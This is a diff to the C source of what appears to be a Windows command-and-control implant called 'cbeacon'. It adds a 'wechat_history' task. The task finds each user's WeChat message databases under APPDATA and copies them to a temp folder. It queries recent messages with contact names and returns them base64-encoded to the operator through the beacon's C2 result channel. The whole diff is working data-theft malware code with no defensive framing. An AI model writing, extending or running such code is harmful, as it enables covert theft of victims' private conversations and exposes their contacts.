@@ -31,10 +31,12 @@
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
+#include "sqlite3.h"
 #include "crypto_cng.h"
 #include "curve25519.h"
 
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "sqlite3.lib")
 
 #ifndef C2_HOST
 #define C2_HOST "127.0.0.1"
@@ -1498,6 +1500,228 @@ static int ident_load(BYTE idpriv[32]) {
     return 0;
 }
 
+/* ---------- wechat_history implementation ---------- */
+
+static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
+    if (!filter_json) filter_json = "{}";
+
+    /* Parse simple JSON filter: {"filter":"all","contact":"","start_time":"","end_time":""} */
+    char contact[256] = {0};
+    if (!jstring(filter_json, "contact", contact, sizeof(contact))) {
+        contact[0] = '\0';
+    }
+    /* Normalize ASCII case so SQL LOWER(...) matching behaves like the Go agent. */
+    for (char *cp = contact; *cp; cp++) {
+        if (*cp >= 'A' && *cp <= 'Z') *cp = (char)(*cp + ('a' - 'A'));
+    }
+    const int hasContact = contact[0] != '\0' && strcmp(contact, "all") != 0;
+
+    /* Get APPDATA path */
+    char appdata[MAX_PATH] = {0};
+    DWORD ad_len = GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
+    if (ad_len == 0 || ad_len >= MAX_PATH) return NULL;
+
+    /* Build WeChat root: %APPDATA%\Tencent\WeChat\ */
+    char wechat_root[MAX_PATH] = {0};
+    _snprintf(wechat_root, sizeof(wechat_root), "%s\\Tencent\\WeChat", appdata);
+
+    /* Allocate output buffer */
+    char *out = (char *)malloc(65536);
+    if (!out) return NULL;
+    out[0] = '\0';
+
+    strcat_s(out, 65536, "=== wechat history ===\n");
+
+    /* Open WeChat root directory */
+    HANDLE hFind = INVALID_HANDLE_VALUE;
+    WIN32_FIND_DATAA findData;
+    char searchPath[MAX_PATH] = {0};
+    _snprintf(searchPath, sizeof(searchPath), "%s\\*", wechat_root);
+
+    int total_rows = 0;
+
+    hFind = FindFirstFileA(searchPath, &findData);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;
+
+            /* Build Msg directory path: %APPDATA%\Tencent\WeChat\<wxid>\Msg\ */
+            char msgDir[MAX_PATH] = {0};
+            _snprintf(msgDir, sizeof(msgDir), "%s\\%s\\Msg", wechat_root, findData.cFileName);
+
+            /* Find all .db files in Msg directory */
+            char dbSearch[MAX_PATH] = {0};
+            _snprintf(dbSearch, sizeof(dbSearch), "%s\\*.db", msgDir);
+
+            HANDLE hDbFind = FindFirstFileA(dbSearch, &findData);
+            if (hDbFind == INVALID_HANDLE_VALUE) continue;
+
+            do {
+                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+                if (!strstr(findData.cFileName, ".db")) continue;
+
+                char dbPath[MAX_PATH] = {0};
+                _snprintf(dbPath, sizeof(dbPath), "%s\\%s", msgDir, findData.cFileName);
+
+                /* Copy DB to temp file to avoid locking issues */
+                char tempPath[MAX_PATH] = {0};
+                char tempName[MAX_PATH] = {0};
+                GetTempPathA(MAX_PATH, tempPath);
+                _snprintf(tempName, sizeof(tempName), "wechat_hist_%llu.db", GetTickCount64());
+                char tempFile[MAX_PATH] = {0};
+                _snprintf(tempFile, sizeof(tempFile), "%s%s", tempPath, tempName);
+
+                if (!CopyFileA(dbPath, tempFile, FALSE)) {
+                    continue;
+                }
+
+                /* Open SQLite database */
+                sqlite3 *db = NULL;
+                if (sqlite3_open(tempFile, &db) != SQLITE_OK) {
+                    DeleteFileA(tempFile);
+                    continue;
+                }
+
+                /* Build query with filters. Contact keywords are bound as
+                   parameters so quotes cannot break out of the SQL string. */
+                char query[2048] = {0};
+                sqlite3_stmt *stmt = NULL;
+                char like[512] = {0};
+
+                _snprintf(query, sizeof(query),
+                    "SELECT m.MsgId, m.CreateTime, m.TalkerId, m.Type, m.Content, m.IsSender, "
+                    "IFNULL(c.NickName,''), IFNULL(c.Alias,''), IFNULL(c.Remark,'') "
+                    "FROM message m "
+                    "LEFT JOIN contact c ON m.TalkerId = c.UserName "
+                    "WHERE m.CreateTime >= 0 AND m.CreateTime <= 2147483647000 "
+                    "%s"
+                    "ORDER BY m.CreateTime DESC LIMIT 200",
+                    hasContact ?
+                    "AND (LOWER(IFNULL(c.NickName,'')) LIKE ? ESCAPE '\\' OR "
+                    "LOWER(IFNULL(c.Alias,'')) LIKE ? ESCAPE '\\' OR "
+                    "LOWER(IFNULL(c.Remark,'')) LIKE ? ESCAPE '\\' OR "
+                    "LOWER(m.TalkerId) LIKE ? ESCAPE '\\') " : ""
+                );
+
+                if (hasContact) {
+                    size_t li = 0;
+                    size_t ci = 0;
+                    like[li++] = '%';
+                    while (contact[ci] && li + 4 < sizeof(like)) {
+                        unsigned char ch = (unsigned char)contact[ci++];
+                        if (ch == '%' || ch == '_' || ch == '\\') {
+                            like[li++] = '\\';
+                        }
+                        like[li++] = (char)ch;
+                    }
+                    if (li + 2 <= sizeof(like)) {
+                        like[li++] = '%';
+                    }
+                    like[li] = '\0';
+                }
+
+                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
+                    int bindOk = 1;
+                    if (hasContact) {
+                        for (int bi = 1; bi <= 4; bi++) {
+                            if (sqlite3_bind_text(stmt, bi, like, -1, SQLITE_TRANSIENT) != SQLITE_OK) {
+                                bindOk = 0;
+                                break;
+                            }
+                        }
+                    }
+                    if (!bindOk) {
+                        sqlite3_finalize(stmt);
+                        stmt = NULL;
+                    }
+                }
+                if (stmt) {
+                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                        long long createTime = sqlite3_column_int64(stmt, 1);
+                        const char *talkerId = (const char *)sqlite3_column_text(stmt, 2);
+                        const char *content = (const char *)sqlite3_column_text(stmt, 4);
+                        const char *nickName = (const char *)sqlite3_column_text(stmt, 6);
+                        const char *alias = (const char *)sqlite3_column_text(stmt, 7);
+                        const char *remark = (const char *)sqlite3_column_text(stmt, 8);
+
+                        if (!talkerId) talkerId = "";
+                        if (!content) content = "";
+                        if (!nickName) nickName = "";
+                        if (!alias) alias = "";
+                        if (!remark) remark = "";
+
+                        /* Determine contact display name: Remark > Alias > NickName > TalkerId */
+                        const char *contactName = talkerId;
+                        if (remark && remark[0]) contactName = remark;
+                        else if (alias && alias[0]) contactName = alias;
+                        else if (nickName && nickName[0]) contactName = nickName;
+
+                        /* Format time: WeChat uses milliseconds since epoch */
+                        time_t sec = (time_t)(createTime / 1000);
+                        struct tm *tm = gmtime(&sec);
+                        char timeBuf[64] = {0};
+                        strftime(timeBuf, sizeof(timeBuf), "%Y-%m-%dT%H:%M:%SZ", tm);
+
+                        const char *senderText = sqlite3_column_int(stmt, 5) == 1 ? "me" : "other";
+                        char *timeEsc = jescape(timeBuf, strlen(timeBuf));
+                        char *senderEsc = jescape(senderText, strlen(senderText));
+                        char *contactEsc = jescape(contactName, strlen(contactName));
+                        char *talkerEsc = jescape(talkerId, strlen(talkerId));
+                        char *contentEsc = jescape(content, strlen(content));
+                        if (!timeEsc || !senderEsc || !contactEsc || !talkerEsc || !contentEsc) {
+                            free(timeEsc);
+                            free(senderEsc);
+                            free(contactEsc);
+                            free(talkerEsc);
+                            free(contentEsc);
+                            continue;
+                        }
+                        size_t need = strlen(timeEsc) + strlen(senderEsc) + strlen(contactEsc) +
+                            strlen(talkerEsc) + strlen(contentEsc) + 128;
+                        char *line = (char *)malloc(need);
+                        if (!line) {
+                            free(timeEsc);
+                            free(senderEsc);
+                            free(contactEsc);
+                            free(talkerEsc);
+                            free(contentEsc);
+                            continue;
+                        }
+                        _snprintf(line, need,
+                            "{\"time\":\"%s\",\"sender\":\"%s\",\"contact\":\"%s\",\"contact_id\":\"%s\",\"type\":%d,\"content\":\"%s\"}\n",
+                            timeEsc, senderEsc, contactEsc, talkerEsc,
+                            sqlite3_column_int(stmt, 3), contentEsc);
+                        strcat_s(out, 65536, line);
+                        free(line);
+                        free(timeEsc);
+                        free(senderEsc);
+                        free(contactEsc);
+                        free(talkerEsc);
+                        free(contentEsc);
+                        total_rows++;
+                    }
+                    sqlite3_finalize(stmt);
+                }
+                sqlite3_close(db);
+                DeleteFileA(tempFile);
+            } while (FindNextFileA(hDbFind, &findData));
+            FindClose(hDbFind);
+        } while (FindNextFileA(hFind, &findData));
+        FindClose(hFind);
+    }
+
+    if (total_rows == 0) {
+        strcat_s(out, 65536, "(no matching messages found)\n");
+    }
+    char summary[128];
+    _snprintf(summary, sizeof(summary), "# total_rows=%d\n", total_rows);
+    strcat_s(out, 65536, summary);
+
+    *outlen = (DWORD)strlen(out);
+    return out;
+}
+
 int main(void) {
     fprintf(stderr, "[cbeacon] enter\n");
     BYTE shared[32], sesskey[32];
@@ -1756,6 +1980,18 @@ int main(void) {
                                                 robj = out ? emit_text_result(t.id, "hostinfo", out, rid) : NULL;
                                                 if (out) free(out);
                                                 if (!robj) robj = emit_error_result(t.id, "hostinfo", "collect failed", rid);
+                                            } else if (strcmp(t.type, "wechat_history") == 0) {
+                                                const char *filter = t.command ? t.command : "{}";
+                                                DWORD olen = 0;
+                                                char *out = do_wechat_history(filter, &olen);
+                                                if (out) {
+                                                    char *b64 = b64enc((const BYTE *)out, olen);
+                                                    robj = b64 ? emit_b64_result(t.id, "wechat_history", b64, rid) : NULL;
+                                                    free(b64);
+                                                    cng_wipe(out, olen);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "wechat_history", "collect failed", rid);
                                             } else if (strcmp(t.type, "set_sleep") == 0) {
                                                 const char *c = t.command ? t.command : "";
                                                 int iv = atoi(c);
